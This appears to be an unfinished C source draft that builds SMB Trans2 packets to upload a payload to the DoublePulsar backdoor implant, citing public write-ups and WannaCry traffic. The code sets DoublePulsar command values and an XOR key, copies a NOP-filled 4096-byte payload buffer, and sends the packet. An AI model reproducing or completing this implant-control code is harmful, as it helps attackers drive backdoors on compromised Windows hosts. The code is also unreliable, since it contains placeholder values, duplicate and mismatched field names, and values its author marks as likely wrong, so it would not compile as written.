//https://blog.rapid7.com/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
//https://www.forcepoint.com/blog/x-labs/evasions-used-shadow-brokers-tools-danderspritz-and-doublepulsar-part-2-2
//https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
//https://www.secpod.com/blog/doublepulsar-a-very-sophisticated-payload-for-windows/

//types: https://docs.microsoft.com/en-us/cpp/cpp/data-type-ranges?view=vs-2019
//https://docs.microsoft.com/en-us/cpp/c-runtime-library/standard-types?view=vs-2019

/* 
modified structure to fit the rapid7 documentation
this is likely to change
Document DoublePulsar traffic from Wireshark
Document Wannacry DoublePulsar traffic from Wireshark & compare
*/

typedef struct {
  uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength; 
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand; 
	uint32_t NtStatus; //0x00000000
	uint8_t flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProccessID; //0xfeff
	uint16_t UserID; 
	uint16_t multipleID;                 //must have a multiplex ID
  
  //trans2 stuff
   uint8_t wordCount;              //setupcount(1) + wordcount (14)
   uint16_t totalParameterCount;
   uint16_t totalDataCount;

   uint16_t ParamCountTotal;
   uint16_t DataCountTotal;

   uint8_t reserved;
	 uint16_t flags;
   uint32_t timeout;   // 0x25 0x89 0x1a 0x00
   uint16_t reserved2;

   uint16_t ParamCountMax;
   uint16_t DataCountMax;
   uint16_t ParamCount;
   uint16_t ParamOffset;
   uint16_t DataCount;
   uint16_t DataOffset;

   uint16_t SetupCount;
   uint16_t SetupData;

   uint8_t reserved3;
   uint16_t function; //0x0e00 also known as Subcommand in Wireshark
   uint16_t ByteCount; //4109 or 0x0d 0x10
   uint8_t padding;
   //added by me
   char SESSION_DATA_PARAMETERS[12]; //Wannacry uses 12 as the size
   char payload[4096];


} SMB_TRANSACTION2_SECONDARY_REQUEST;

char data[4096];

int sendStuff()
{
      char CHAR_XOR_KEY[4]; //This is from DoublePulsar XOR key calculator; the calculated char is stored here

      //set data buffer to hold dummy data 
      memset(data,0x90, 4096);

      SMB_TRANSACTION2_SECONDARY_REQUEST uploadpacket;
      //set SMB values
      uploadpacket.ProtocolHeader[0] = '\xff';
      uploadpacket.ProtocolHeader[1] = 'S';
      uploadpacket.ProtocolHeader[2] = 'M';
      uploadpacket.ProtocolHeader[3] = 'B';
      
      uploadpacket.SmbCommand = 0x32; //Trans2 
      uploadpacket.Flags = 0x18;
      uploadpacket.Flags2 = 0xC007;
      
      uploadpacket.ProcessID = 0xfeff;
      uploadpacket.signature = 0x00000000;
      uploadpacket.TreeID = 2018; //grab from SMB response
      uploadpacket.MultiplexID = 41; //find out the true value, should it be 41?

      //trans2 packet stuff
      uploadpacket.wordCount = 14 + 1;
      
      //FIX ME
      uploadpacket.totalParameterCount = NULL; //find out how to get this value!
      /////////
      uploadpacket.totalDataCount = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQ);
      
      uploadpacket.Timeout = 0x25891a00; //find out the total timeout value, this is most likely wrong!
      //0x866c3100 = PING command
      
      uploadpacket.ParamCountTotal = 1;
      uploadpacket.DataCountTotal = 0;
      uploadpacket.ParamCountMax = 1;
      uploadpacket.DataCountMax = 0;
      uploadpacket.ParamCount = __find__value__here (parameter length)
      uploadpacket.ParamOffset = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQUEST) + (1 * 2) - 4;
      uploadpacket.DataCount = 0;
      uploadpacket.DataOffset = __find__value__here
      uploadpacket.SetupCount = __find__value__here
      uploadpacket.SetupData = __find__value__here
      uploadpacket.function = 0x0e00;
      uploadpacket.byteCount = 4109;
      memcpy(uploadpacket.SESSION_DATA_PARAMETERS, "GIBERISH" , 8);
      memcpy(uploadpacket.SESSION_DATA_PARAMETERS + 8, CHAR_XOR_KEY, 4);
      memcpy(uploadpacket.payload, data, 4096);

      //send data
      send(socket, (char*)uploadpacket,sizeof(uploadpacket),0);
}
